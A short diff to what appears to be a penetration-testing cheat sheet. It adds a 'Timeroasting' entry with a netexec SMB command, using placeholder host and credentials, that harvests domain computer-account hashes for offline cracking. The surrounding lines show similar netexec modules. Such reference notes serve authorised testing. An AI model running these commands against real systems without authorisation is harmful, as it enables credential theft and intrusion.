@@ -3537,6 +3537,12 @@ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M notepad
 netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M notepad++
 ```
 
+###### Timeroasting
+
+```console
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M timeroast
+```
+
 ###### User Handling
 
 ###### Change User Password
